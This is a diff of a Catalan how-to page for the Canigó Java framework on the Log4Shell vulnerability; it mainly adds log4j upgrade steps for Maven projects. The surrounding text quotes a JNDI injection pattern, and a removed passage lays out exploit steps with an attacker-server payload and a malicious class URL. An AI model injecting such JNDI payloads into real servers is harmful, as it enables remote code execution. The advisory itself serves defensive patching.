@@ -1,5 +1,5 @@
 +++
-date        = "2021-12-17"
+date        = "2021-12-21"
 title       = "Canigó. Vulnerabilitat CVE-2021-44228 (Log4Shell)"
 description = "Com resoldre la vulnerabilitat crítica detectada CVE-2021-44228 (Log4Shell) a les aplicacions"
 section     = "howtos"
@@ -10,18 +10,6 @@ key         = "GENER2022"
 La vulnerabilitat [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) permet executar codi en un
 servidor remot, injectant una petició JNDI `${jndi:(ldap|rmi|etc)}` dins de qualsevol variable que es registri al log del servidor.
 Aquesta vulnerabilitat **només afecta les versions `2.x` de Log4J i es troba corregida en la versió `2.16.0`**.
-
-Per a explotar la vulnerabilitat, es poden seguir els següents passos:
-
-1. En el servidor que allotja l'aplicació vulnerable, es registra la informació que conté la càrrega útil maliciosa.
-Per exemple: `${jndi:ldap://[servidor]/[càrrega útil]}`, on el servidor està controlat per l'atacant i la càrrega útil conté les comandes a executar.
-
-2. La vulnerabilitat s'activa i el servidor vulnerable sol·licita al servidor de l'atacant a través de JNDI el codi maliciós.
-
-3. La resposta del servidor de l'atacant conté la ruta a una classe Java maliciosa. Per exemple: `http://[servidor]/exploit.class`,
-que s'injecta en el context de l'aplicació vulnerable.
-
-4. La càrrega útil injectada permet a l'atacant executar codi arbitrari.
 
 <br/>
 Informació de referència:
@@ -51,6 +39,8 @@ Per a més informació: https://logging.apache.org/log4j/2.x/security.html#CVE-2
 
 Cal substituir la versió de la dependència de la libreria `log4j` en temps de compilació.
 
+### Aplicacions Canigó (Spring Boot)
+
 * Opció 1) Modificar el fitxer `pom.xml` - **opció recomanada** -, compilar i desplegar l'aplicació:
 
     > * Sí el JDK és major o igual a `1.8`:
@@ -70,6 +60,32 @@ Cal substituir la versió de la dependència de la libreria `log4j` en temps de 
 * Opció 2) Injectar la variable durant la construcció de l'aplicació, compilar i desplegar l'aplicació:
 ```sh
 mvn -Dlog4j2.version=2.16.0 clean package && java -jar ./target/CanigoLog4jShellTest.war
+```
+
+### Aplicacions que facin ús dels mòduls de Canigó (sense Spring Boot)
+
+Si no és possible actualitzar a la última versió dels mòduls - **opció recomanada** -, caldrà aplicar exclusions, incloure les noves
+dependències, compilar i desplegar l'aplicació. Per exemple:
+
+```xml
+<dependency>
+  <groupId>cat.gencat.ctti</groupId>
+  <artifactId>canigo.core</artifactId>
+  <version>${canigo.core.version}</version>
+  <exclusions>
+	<exclusion>
+	  <groupId>org.apache.logging.log4j</groupId>
+	  <artifactId>log4j-core</artifactId>
+	</exclusion>
+	...
+  </exclusions>
+</dependency>
+<dependency>
+  <groupId>org.apache.logging.log4j</groupId>
+  <artifactId>log4j-core</artifactId>
+  <version>2.16.0</version>
+</dependency>
+...
 ```
 
 ## Noves versions de Canigó 3.4 i 3.6
